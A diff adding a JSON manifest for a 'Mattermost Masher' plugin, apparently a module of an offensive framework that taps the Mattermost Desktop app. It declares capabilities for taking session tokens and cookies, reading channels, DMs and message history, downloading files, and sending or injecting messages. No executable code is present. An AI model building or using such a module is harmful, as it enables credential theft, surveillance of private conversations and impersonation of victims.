@@ -1,0 +1,89 @@
+{
+  "id": "mattermost",
+  "name": "Mattermost Masher",
+  "version": "1.0.0",
+  "description": "Extracts credentials, lists channels/DMs, fetches message history, and allows sending messages from a tapped Mattermost Desktop instance.",
+  "author": "operator",
+  "targetApps": ["mattermost", "Mattermost"],
+  "capabilities": {
+    "mainProcess": true,
+    "renderer": false,
+    "ui": true
+  },
+  "dataTypes": [
+    {
+      "name": "credentials",
+      "label": "Credentials",
+      "fields": ["token", "cookie", "serverUrl", "teamId", "teamName", "userId", "userName"]
+    },
+    {
+      "name": "channel_list",
+      "label": "Channels",
+      "fields": ["channels"]
+    },
+    {
+      "name": "user_list",
+      "label": "Users",
+      "fields": ["users"]
+    },
+    {
+      "name": "messages",
+      "label": "Messages",
+      "fields": ["channelId", "channelName", "messages"]
+    },
+    {
+      "name": "send_result",
+      "label": "Send Results",
+      "fields": ["channelId", "ok", "error"]
+    },
+    {
+      "name": "search_results",
+      "label": "Search Results",
+      "fields": ["query", "matches", "total"]
+    },
+    {
+      "name": "inject_result",
+      "label": "Inject Result",
+      "fields": ["channelId", "strategy", "success", "error"]
+    },
+    {
+      "name": "server_list",
+      "label": "Servers",
+      "fields": ["servers", "activeIndex"]
+    },
+    {
+      "name": "injected_messages",
+      "label": "Injected Messages",
+      "fields": ["messages", "count"]
+    },
+    {
+      "name": "clear_injected_result",
+      "label": "Clear Injected Result",
+      "fields": ["success", "cleared", "method"]
+    },
+    {
+      "name": "switch_complete",
+      "label": "Switch Complete",
+      "fields": ["serverIndex", "serverUrl", "teamName"]
+    },
+    {
+      "name": "file_download",
+      "label": "File Download",
+      "fields": ["fileId", "fileName", "contentType", "data", "error"]
+    }
+  ],
+  "settings": [
+    {
+      "key": "autoFetchChannels",
+      "label": "Auto-fetch channels on load (1=yes, 0=no)",
+      "type": "number",
+      "default": 1
+    },
+    {
+      "key": "retryInterval",
+      "label": "Credential retry interval (seconds)",
+      "type": "number",
+      "default": 15
+    }
+  ]
+}
